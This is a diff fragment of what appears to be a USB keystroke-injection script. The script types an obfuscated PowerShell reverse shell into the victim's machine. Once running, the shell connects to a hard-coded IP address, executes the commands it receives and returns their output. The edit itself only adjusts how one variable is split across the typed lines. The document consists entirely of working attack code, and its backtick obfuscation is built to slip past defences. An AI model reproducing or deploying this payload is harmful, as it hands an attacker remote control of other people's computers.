@@ -7,7 +7,7 @@ ENTER
 DELAY 1500
 STRING $client = New-`oBJ`ECt System.Net.Sockets.TCPClient("10.16.20.23",65534);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i
 DELAY 100
-STRING i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (N`ew-O`BjEcT -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (i`EX $data 2>&1 | out-st`Ri`Ng );$sendback2  = $sendback + "PS " + (P`wd).Path + "> ";$sendbyte =
+STRING  = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (N`ew-O`BjEcT -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (i`EX $data 2>&1 | out-st`Ri`Ng );$sendback2  = $sendback + "PS " + (P`wd).Path + "> ";$sendbyte =
 DELAY 100
 STRING  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 DELAY 100
